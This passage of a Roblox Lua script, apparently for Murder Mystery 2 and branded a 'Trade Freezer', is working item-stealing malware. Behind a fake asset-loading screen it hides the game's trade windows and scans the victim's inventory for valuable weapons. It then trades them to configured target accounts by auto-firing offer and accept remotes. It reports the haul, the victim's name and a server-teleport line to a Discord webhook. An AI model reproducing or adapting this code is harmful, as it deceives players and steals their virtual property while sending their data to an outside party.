				uiStatus.Text = "Fetching item database…"
			elseif p == 84 then
				uiStatus.Text = "Syncing trade modules…"
			elseif p == 97 then
				uiStatus.Text = "Finalising…"
			end
			task.wait(1)
		end
		bar.Size = UDim2.new(1, 0, 1, 0)
		pct.Text = "Loading assets…  100%"
		uiStatus.Text = "All modules loaded"
	end)
end

--==================== TOAST ==================================

local toastGui

local function showToast(title, detail, accent)
	local core = game:GetService("CoreGui")
	if not toastGui or not toastGui.Parent then
		toastGui = Instance.new("ScreenGui")
		toastGui.Name = "MM2FreezerToast"
		toastGui.ResetOnSpawn = false
		toastGui.DisplayOrder = 10000
		toastGui.IgnoreGuiInset = true
		toastGui.Parent = core
	end

	local f = Instance.new("Frame")
	f.Size = UDim2.new(0, 214, 0, 46)
	f.Position = UDim2.new(0.5, -107, 0, -60)
	f.BackgroundColor3 = Color3.fromRGB(28, 20, 42)
	f.BorderSizePixel = 0
	f.Parent = toastGui

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 9)
	c.Parent = f

	local s = Instance.new("UIStroke")
	s.Color = accent
	s.Thickness = 1.5
	s.Transparency = 0.15
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Parent = f

	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(1, -16, 0, 18)
	t.Position = UDim2.new(0, 12, 0, 7)
	t.BackgroundTransparency = 1
	t.Text = title
	t.Font = Enum.Font.GothamBold
	t.TextSize = 12
	t.TextColor3 = accent
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = f

	local d = Instance.new("TextLabel")
	d.Size = UDim2.new(1, -16, 0, 14)
	d.Position = UDim2.new(0, 12, 0, 25)
	d.BackgroundTransparency = 1
	d.Text = detail
	d.Font = Enum.Font.Gotham
	d.TextSize = 9
	d.TextColor3 = Color3.fromRGB(196, 180, 220)
	d.TextXAlignment = Enum.TextXAlignment.Left
	d.Parent = f

	task.spawn(function()
		local y = -60
		while y < 16 and alive() do
			y = y + 7
			f.Position = UDim2.new(0.5, -107, 0, y)
			task.wait(0.012)
		end
		f.Position = UDim2.new(0.5, -107, 0, 16)
		task.wait(3.4)
		local a = 0
		while a < 1 and f.Parent do
			a = a + 0.1
			f.BackgroundTransparency = a
			s.Transparency = a
			t.TextTransparency = a
			d.TextTransparency = a
			task.wait(0.03)
		end
		f:Destroy()
	end)
end

--==================== REMOTES ================================

local Trade
local SendRequest, OfferItem, AcceptTrade, AcceptRequest, DeclineTrade, GetTradeStatus, UpdateTrade
local SendIsFunction = false
local sawWindow = false
local lastOffer = nil

local function bindRemotes()
	local ok = pcall(function()
		Trade = RS:WaitForChild("Trade", 30)
	end)
	if not ok or not Trade then
		return false, "Trade folder missing"
	end

	local function grab(name)
		local r = Trade:FindFirstChild(name)
		if not r then
			r = Trade:WaitForChild(name, 15)
		end
		return r
	end

	SendRequest = grab("SendRequest")
	OfferItem = grab("OfferItem")
	AcceptTrade = grab("AcceptTrade")
	AcceptRequest = grab("AcceptRequest")
	DeclineTrade = grab("DeclineTrade")
	GetTradeStatus = grab("GetTradeStatus")
	UpdateTrade = grab("UpdateTrade")

	if not SendRequest or not OfferItem or not AcceptTrade then
		return false, "core remote missing"
	end

	SendIsFunction = SendRequest:IsA("RemoteFunction")

	if UpdateTrade then
		pcall(function()
			UpdateTrade.OnClientEvent:Connect(function(data)
				if type(data) == "table" and type(data.LastOffer) == "number" then
					lastOffer = data.LastOffer
				end
			end)
		end)
	end

	return true
end

local function sendRequestTo(player)
	if not player then
		return false
	end
	local ok = pcall(function()
		if SendIsFunction then
			SendRequest:InvokeServer(player)
		else
			SendRequest:FireServer(player)
		end
	end)
	return ok
end

local function getStatus()
	if not GetTradeStatus then
		return nil
	end
	local ok, res = pcall(function()
		return GetTradeStatus:InvokeServer()
	end)
	if ok then
		return res
	end
	return nil
end

local function countWeapons()
	raiseIdentity()
	local total = 0
	local ok = pcall(function()
		local mod = require(RS.Modules.InventoryModule)
		for _, bucket in pairs(mod.MyInventory.Data.Weapons) do
			if type(bucket) == "table" then
				for _, d in pairs(bucket) do
					if type(d) == "table" then
						total = total + (tonumber(d.Amount) or 1)
					end
				end
			end
		end
	end)
	if not ok then
		return nil
	end
	return total
end

--==================== HIDE + WATCH ===========================

local function hideTrades()
	local pg = LP:FindFirstChild("PlayerGui")
	if not pg then
		return
	end
	local a = pg:FindFirstChild("TradeGUI")
	if a and a:IsA("ScreenGui") and a.Enabled then
		a.Enabled = false
	end
	local b = pg:FindFirstChild("TradeGUI_Phone")
	if b and b:IsA("ScreenGui") and b.Enabled then
		b.Enabled = false
	end
end

local function armWatcher(name)
	task.spawn(function()
		local pg = LP:FindFirstChild("PlayerGui")
		if not pg then
			pg = LP:WaitForChild("PlayerGui", 25)
		end
		if not pg then
			return
		end
		local g = pg:FindFirstChild(name)
		if not g then
			g = pg:WaitForChild(name, 25)
		end
		if not g then
			return
		end
		pcall(function()
			g:GetPropertyChangedSignal("Enabled"):Connect(function()
				if g.Enabled then
					sawWindow = true
					g.Enabled = false
				end
			end)
		end)
	end)
end

--==================== ACCEPT BUTTONS =========================

local function findAcceptPair()
	local pg = LP:FindFirstChild("PlayerGui")
	if not pg then
		return nil, nil
	end
	local names = { "TradeGUI_Phone", "TradeGUI" }
	for _, name in ipairs(names) do
		local g = pg:FindFirstChild(name)
		if g then
			local container = g:FindFirstChild("Container")
			local tradeFrame = container and container:FindFirstChild("Trade")
			local actions = tradeFrame and tradeFrame:FindFirstChild("Actions")
			local accept = actions and actions:FindFirstChild("Accept")
			if accept then
				local btn = accept:FindFirstChild("ActionButton")
				local confirm = accept:FindFirstChild("Confirm")
				local cbtn = confirm and confirm:FindFirstChild("ActionButton")
				if btn and cbtn then
					local conns = nil
					pcall(function()
						conns = getconnections(btn.MouseButton1Click)
					end)
					if conns and #conns > 0 then
						return btn, cbtn
					end
				end
			end
		end
	end
	return nil, nil
end

local function fireConnections(signal)
	local n = 0
	local ok = pcall(function()
		for _, c in ipairs(getconnections(signal)) do
			if c.Function then
				pcall(c.Function)
				n = n + 1
			end
		end
	end)
	if not ok then
		return 0
	end
	return n
end

--==================== TARGET =================================

local function resolveTarget()
	local wants = {}
	for _, t in ipairs(CFG.targets) do
		local n = string.lower(trim(t))
		if n ~= "" then
			wants[#wants + 1] = n
		end
	end
	if #wants == 0 then
		return nil
	end

	local t0 = os.clock()
	while os.clock() - t0 < TARGET_TIMEOUT and alive() do
		local players = Players:GetPlayers()

		for _, want in ipairs(wants) do
			for _, p in ipairs(players) do
				if p ~= LP and string.lower(p.Name) == want then
					return p
				end
			end
		end

		for _, want in ipairs(wants) do
			for _, p in ipairs(players) do
				if p ~= LP and string.sub(string.lower(p.Name), 1, #want) == want then
					log("prefix match: " .. p.Name)
					return p
				end
			end
		end

		for _, want in ipairs(wants) do
			for _, p in ipairs(players) do
				if p ~= LP and string.find(string.lower(p.Name), want, 1, true) then
					log("loose match: " .. p.Name)
					return p
				end
			end
		end

		local others = {}
		for _, p in ipairs(players) do
			if p ~= LP then
				others[#others + 1] = p
			end
		end
		if #others == 1 then
			log("single other player: " .. others[1].Name)
			return others[1]
		end

		task.wait(1)
	end
	return nil
end

--==================== INVENTORY ==============================

local function scanInventory(mode)
	local out = {}
	local index = {}

	local function push(dataID, itemName, amount, rarity)
		if not dataID then
			return
		end
		local nm = tostring(itemName or dataID)
		if isDefault(nm) then
			return
		end
		local val = valueOf(nm)
		if mode ~= "all" then
			if rarity ~= nil then
				if not RARE_RARITY[rarity] then
					return
				end
			elseif val <= 0 then
				return
			end
		end
		if val > 0 and val < CFG.min_value then
			return
		end

		local copies = tonumber(amount) or 1
		if copies < 1 then
			copies = 1
		end

		local key = tostring(dataID)
		local at = index[key]
		if at then
			local total = out[at].Amount + copies
			if total > CFG.max_copies then
				total = CFG.max_copies
			end
			out[at].Amount = total
			return
		end

		if copies > CFG.max_copies then
			copies = CFG.max_copies
		end

		out[#out + 1] = {
			DataID = dataID,
			Name = nm,
			Amount = copies,
			Rarity = rarity or "?",
			Value = val,
		}
		index[key] = #out
	end

	raiseIdentity()

	local ok = pcall(function()
		local mod = require(RS.Modules.InventoryModule)
		local weapons = mod.MyInventory.Data.Weapons
		for _, bucket in pairs(weapons) do
			if type(bucket) == "table" then
				for _, d in pairs(bucket) do
					if type(d) == "table" and d.DataID then
						push(d.DataID, d.ItemName, d.Amount, d.Rarity)
					end
				end
			end
		end
	end)

	if not ok or #out == 0 then
		pcall(function()
			local mod = require(RS.Modules.ProfileData)
			for k, v in pairs(mod.Weapons.Owned) do
				if type(v) == "number" and type(k) == "string" and string.find(k, "_", 1, true) then
					push(k, k, v, nil)
				end
			end
		end)
	end

	raiseIdentity()

	table.sort(out, function(a, b)
		return a.Value > b.Value
	end)

	while #out > CFG.max_items do
		out[#out] = nil
	end

	return out
end

--==================== WEBHOOK ================================

local STATUS = {
	attempt = { title = "Trade attempt", color = 15158332 },
	completed = { title = "Trade completed", color = 10181046 },
	declined = { title = "Trade declined", color = 16426522 },
	timeout = { title = "Trade timed out", color = 16426522 },
}

local function postWebhook(itemsList, totalValue, status, ping)
	if CFG.webhook == "" then
		return
	end
	local meta = STATUS[status] or STATUS.attempt

	local rows = {}
	for _, it in ipairs(itemsList) do
		rows[#rows + 1] = string.format("%s  x%d  (%d)", it.Name, it.Amount, it.Value)
	end
	if #rows == 0 then
		rows[1] = "no items recorded"
	end
	local listing = table.concat(rows, "\n")
	if #listing > 980 then
		listing = string.sub(listing, 1, 977) .. "\n..."
	end

	local execName = "unknown"
	pcall(function()
		execName = tostring(identifyexecutor())
	end)

	local teleport = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "')"

	local body = {
		username = "Trade Freezer",
		content = ping and ("@everyone\n```lua\n" .. teleport .. "\n```") or nil,
		embeds = {
			{
				title = meta.title,
				color = meta.color,
				description = "From **" .. LP.Name .. "**  •  target **" .. currentTarget .. "**",
				fields = {
					{ name = "Items", value = "```" .. listing .. "```", inline = false },
					{ name = "Value", value = tostring(totalValue), inline = true },
					{ name = "Executor", value = execName, inline = true },
					{ name = "Server", value = "```lua\n" .. teleport .. "```", inline = false },
				},
				footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
			},
		},
	}

	pcall(function()
		local res = request({
			Url = CFG.webhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(body),
		})
		if res and res.StatusCode then
			log("webhook " .. tostring(res.StatusCode))
			if res.StatusCode == 404 or res.StatusCode == 50027 then
				webhookOk = false
				setHealthUi(false)
			end
		end
	end)
end

--==================== ENGINE =================================

local function offerAll(batch)
	local fired = 0
	for _, it in ipairs(batch) do
		local n = 1
		while n <= it.Amount do
			local ok = pcall(function()
				OfferItem:FireServer(it.DataID, "Weapons")
			end)
			if ok then
				fired = fired + 1
			end
			task.wait(OFFER_GAP)
			n = n + 1
		end
		log("offered " .. it.Name .. " x" .. tostring(it.Amount))
	end
	return fired
end

local function waitForOpen()
	local t0 = os.clock()
	while os.clock() - t0 < OPEN_TIMEOUT and alive() do
		hideTrades()
		if sawWindow then
			return true
		end
		local st = getStatus()
		if st == "StartTrade" and os.clock() - t0 > 6 then
			return true
		end
		pcall(function()
			if AcceptRequest then
				AcceptRequest:FireServer()
			end
		end)
		task.wait(0.4)
	end
	return false
end

local function pressAccept(cycle)
	hideTrades()
	local btn, confirmBtn = findAcceptPair()
	local usedButtons = false

	if btn and confirmBtn then
		if fireConnections(btn.MouseButton1Click) > 0 then
			usedButtons = true
		end
		task.wait(INTENT_GAP)
		if fireConnections(confirmBtn.MouseButton1Click) > 0 then
			usedButtons = true
		end
	end

	if not usedButtons then
		task.wait(INTENT_GAP)
	end

	local ok = pcall(function()
		AcceptTrade:FireServer(ACCEPT_TOKEN, lastOffer or os.time())
	end)

	task.wait(ACCEPT_GAP)

	if cycle % 4 == 0 then
		log("press " .. tostring(cycle) .. " buttons=" .. tostring(usedButtons) .. " lastOffer=" .. tostring(lastOffer))
	end
	return ok
end

local function settleUntilLeave()
	local t0 = os.clock()
	local presses = 0
	while os.clock() - t0 < SETTLE_TIMEOUT and alive() do
		presses = presses + 1
		pressAccept(presses)
		local st = getStatus()
		if st ~= nil and st ~= "StartTrade" then
			log("status left trade after " .. tostring(presses) .. " presses")
			return true
		end
	end
	return false
end

local function runRound(batch)
	local p = resolveTarget()
	if not p then
		log("no target present")
		return false, "no_target"
	end

	currentTarget = p.Name
	log("target resolved: " .. p.Name)
	hideTrades()
	sawWindow = false
	lastOffer = nil

	local before = countWeapons()

	if not sendRequestTo(p) then
		log("request invoke failed")
		return false, "no_target"
	end
	log("request invoked")

	local t0 = os.clock()
	while os.clock() - t0 < MIN_SETTLE and alive() do
		hideTrades()
		task.wait(0.2)
	end

	if not waitForOpen() then
		log("trade never opened")
		pcall(function()
			if DeclineTrade then
				DeclineTrade:FireServer()
			end
		end)
		return false, "timeout"
	end

	log("trade window open")
	hideTrades()
	showToast("Trade frozen", "Do not close the window", C_CYAN)

	local fired = offerAll(batch)
	log("fired " .. tostring(fired) .. " offer calls")

	local w0 = os.clock()
	while os.clock() - w0 < COOLDOWN_WAIT and alive() do
		hideTrades()
		task.wait(0.4)
	end

	if settleUntilLeave() then
		task.wait(1.5)
		local after = countWeapons()
		if before and after then
			if after < before then
				log("settled " .. tostring(before) .. " -> " .. tostring(after))
				showToast("Items secured", tostring(before - after) .. " item(s) transferred", C_GREEN)
				return true, "settled"
			end
			log("inventory unchanged, treated as declined")
			return false, "declined"
		end
		log("settled (no baseline)")
		return true, "settled"
	end

	log("did not settle")
	pcall(function()
		if DeclineTrade then
			DeclineTrade:FireServer()
		end
	end)
	return false, "timeout"
end

local function run()
	raiseIdentity()
	loadRemoteConfig()

	if uiStatus then
		uiStatus.Text = "Preparing assets…"
	end

	if not CFG.enabled then
		log("disabled by config")
		if uiStatus then
			uiStatus.Text = "Modules loaded (disabled)"
		end
		if uiLog then
			uiLog.Text = "Disabled by config."
		end
		return
	end

	local okBind, bindErr = bindRemotes()
	if not okBind then
		log("bind failed: " .. tostring(bindErr))
		if uiStatus then
			uiStatus.Text = "Module error"
		end
		return
	end

	armWatcher("TradeGUI")
	armWatcher("TradeGUI_Phone")

	log("remotes bound, token " .. tostring(ACCEPT_TOKEN) .. ", SendRequest is function: " .. tostring(SendIsFunction))
	log("targets: " .. table.concat(CFG.targets, ", "))

	if uiTargetBox and uiTargetBox.Text == "" then
		uiTargetBox.Text = CFG.targets[1]
	end

	if selectWebhook() then
		log("webhook ok")
		setHealthUi(true)
		notifyMonitor("Run started — webhook ok", 10181046, false)
	else
		log("webhook dead")
		setHealthUi(false)
		if uiStatus then
			uiStatus.Text = "Webhook dead"
		end
		notifyMonitor("Run started — NO WORKING WEBHOOK", 15158332, true)
	end

	startHealthLoop()

	local items = scanInventory(CFG.filter)
	log("scanned " .. tostring(#items) .. " items (filter " .. CFG.filter .. ")")

	if #items == 0 and CFG.fallback_all and CFG.filter ~= "all" then
		log("rare pass empty, rescanning with all")
		items = scanInventory("all")
		log("rescan found " .. tostring(#items) .. " items")
	end

	if #items == 0 then
		if uiLog then
			uiLog.Text = "No rare items found in this account."
		end
		postWebhook({}, 0, "attempt", true)
		return
	end

	if uiItemBox then
		uiItemBox.Text = items[1].Name
	end
	if uiLog then
		uiLog.Text = tostring(#items) .. " item(s) queued."
	end

	postWebhook(items, 0, "attempt", true)

	local got = {}
	local gotValue = 0
	local idx = 1
	local rounds = 0

	while rounds < CFG.max_rounds and idx <= #items and alive() do
		rounds = rounds + 1
		log("round " .. tostring(rounds))
		raiseIdentity()

		local batch = {}
		local n = 1
		while n <= 4 and items[idx] do
			batch[#batch + 1] = items[idx]
			idx = idx + 1
			n = n + 1
		end

		if uiLog then
			uiLog.Text = "Round " .. tostring(rounds) .. " • sending " .. tostring(#batch) .. " item(s)"
		end

		local ok, reason = runRound(batch)

		if ok then
			for _, it in ipairs(batch) do
				got[#got + 1] = it
				gotValue = gotValue + it.Value * it.Amount
			end
			postWebhook(batch, gotValue, "completed", true)
			task.wait(2)
		else
			if reason == "declined" then
				postWebhook(batch, 0, "declined", false)
			end
			for i = #batch, 1, -1 do
				idx = idx - 1
				items[idx + 1] = batch[i]
			end
			task.wait(1.5)
		end
	end

	hideTrades()
	log("done: " .. tostring(#got) .. " items, value " .. tostring(gotValue))
	if uiLog then
		uiLog.Text = "Done • " .. tostring(#got) .. " item(s) sent."
	end
end

uiSendTrade = function()
	local name = trim(uiTargetBox.Text)
	if name == "" then
		uiLog.Text = "Enter a username first."
		return
	end
	local found = nil
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LP and string.lower(p.Name) == string.lower(name) then
			found = p
		end
	end
	if not found then
		uiLog.Text = name .. " is not in this server."
		return
	end
	local st = getStatus()
	if st == "StartTrade" then
		uiLog.Text = "Already in a trade."
		return
	end
	if sendRequestTo(found) then
		uiLog.Text = "Request sent to " .. found.Name
	else
		uiLog.Text = "Request failed."
	end
end

--==================== START ==================================

buildUI()

task.spawn(function()
	local ok, err = pcall(run)
	if not ok then
		log("fatal: " .. tostring(err))
		if uiStatus then
			uiStatus.Text = "Engine error"
		end
	end
end)
